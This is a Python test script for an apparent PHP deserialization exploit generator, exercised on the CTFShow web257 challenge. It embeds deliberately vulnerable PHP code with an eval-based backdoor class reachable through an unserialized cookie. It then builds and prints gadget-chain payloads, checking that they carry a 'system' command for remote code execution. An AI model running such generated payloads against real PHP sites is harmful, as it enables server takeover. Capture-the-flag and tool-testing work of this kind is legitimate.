"""Test heuristic chain builder on CTFSHOW web257."""
import sys; sys.path.insert(0, '.')
from engine.analyzer import PHPSourceAnalyzer
from engine.payload import PayloadGenerator
import re

src = '''<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfShowUser{
    private $username='xxxxxx'; private $password='xxxxxx';
    private $isVip=false; private $class = 'info';
    public function __construct(){ $this->class=new info(); }
    public function login($u,$p){ return $this->username===$u&&$this->password===$p; }
    public function __destruct(){ $this->class->getInfo(); }
}
class info{ private $user='xxxxxx'; public function getInfo(){ return $this->user; } }
class backDoor{ private $code; public function getInfo(){ eval($this->code); } }
$username=$_GET['username']; $password=$_GET['password'];
if(isset($username) && isset($password)){ $user = unserialize($_COOKIE['user']); $user->login($username,$password); }
'''

a = PHPSourceAnalyzer()
r = a.analyze(src)
print(f"Classes: {[c.name for c in r.classes]}")
print(f"Strategy: {r.strategy}")

# Show edges from method bodies
print("\nEdges found:")
for cls in r.classes:
    for m in cls.methods:
        body = m.body
        for mm in re.finditer(r'\$this->(\w+)\s*->\s*(\w+)\(', body):
            print(f"  {cls.name}::{m.name} -> {mm.group(1)} -> {mm.group(2)}()")
        for mm in re.finditer(r'eval\(', body):
            print(f"  {cls.name}::{m.name} -> [SINK:eval]")

g = PayloadGenerator()
all_ps = g.generate(r)
print(f"\nAll payloads: {len(all_ps)}")
for p in all_ps:
    print(f"  [{p.strategy}] [{p.http_method}] {p.description[:80]}")
    if p.serialized_string:
        s = p.serialized_string
        for ch in '\x00': s = s.replace(ch, '\\0')
        print(f"    {s[:200]}")
    if p.cookies:
        print(f"    cookies: {p.cookies}")

# Now test heuristic chain specifically
print("\n--- Heuristic chain ---")
chain = g._build_heuristic_chain(r)
if chain:
    print(f"Path: {' -> '.join(chain['names'])}")
    s = chain['serialized']
    for ch in '\x00': s = s.replace(ch, '\\0')
    print(f"Full payload ({len(chain['serialized'])} bytes):")
    print(f"  {s}")
    if 'system' in chain['serialized']:
        print("  CORRECT: RCE payload set!")
    else:
        print("  MISSING: no RCE command in payload")
else:
    print("No heuristic chain found")
